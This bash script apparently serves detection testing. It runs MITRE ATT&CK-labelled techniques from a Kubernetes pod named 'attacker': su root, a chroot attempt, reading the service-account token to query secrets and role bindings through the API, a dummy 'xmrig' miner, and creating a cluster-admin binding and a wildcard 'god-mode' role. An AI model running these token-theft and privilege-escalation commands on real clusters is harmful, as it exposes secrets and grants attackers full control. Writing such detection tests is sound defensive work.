#!/bin/bash
set -x

echo "### T1548 (again, fresh) + T1611 + T1552 close together -> fires escalation + breakout chains ###"
kubectl exec attacker -- su root -c "id"
sleep 1
kubectl exec attacker -- chroot / /bin/true
sleep 1
kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets'
sleep 2

echo "### T1496: cryptomining process signature (dummy binary named xmrig) ###"
kubectl exec attacker -- bash -c "cp /bin/true /tmp/xmrig && chmod +x /tmp/xmrig && /tmp/xmrig"
sleep 2

echo "### T1499: fork-bomb-like exec burst (30 execs fast) ###"
kubectl exec attacker -- bash -c 'for i in $(seq 1 30); do /bin/true; done'
sleep 2

echo "### T1613: RBAC/resource discovery burst (10 reads in <30s, same identity) ###"
for i in $(seq 1 10); do
  kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterrolebindings' > /dev/null 2>&1
done
sleep 2

echo "### T1548.005: RBAC abuse - new cluster-admin binding + wildcard ClusterRole (live, post-server-start) ###"
kubectl create clusterrolebinding demo-t1548-005 --clusterrole=cluster-admin --serviceaccount=default:legitimate-app 2>&1
kubectl create clusterrole god-mode --verb="*" --resource="*" 2>&1
sleep 2

echo "### DONE ###"
